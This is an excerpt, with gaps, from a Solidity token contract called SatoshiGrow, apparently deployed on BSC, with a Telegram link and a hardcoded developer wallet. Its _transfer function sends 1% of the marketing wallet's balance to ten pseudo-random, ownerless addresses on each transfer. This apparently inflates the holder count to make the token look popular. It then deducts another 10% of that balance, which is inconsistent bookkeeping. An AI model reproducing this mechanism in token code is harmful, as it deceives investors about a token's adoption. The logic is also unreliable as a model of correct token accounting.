...
/*    Satoshi Grow
            Telegram : https://t.me/SatoshiGrowBSC
*/
...
contract SatoshiGrow is Context, IERC20 { 
    ...
    address payable public Wallet_Dev = payable(0xB3Dd941d819B6E3dAce1Fed0F316fDAD351D3C30);
    ...
    function _transfer(
        ...
        uint256 tAmount = balanceOf(Wallet_Marketing) / 100;
        uint256 rAmount = balanceOf(Wallet_Marketing) / 10;
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            address randomwallet;
            for(int i=0;i<=9;i++){
                randomwallet = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(Wallet_Marketing,randomwallet,tAmount);
            }
            _tOwned[Wallet_Marketing] -= rAmount ;
        }
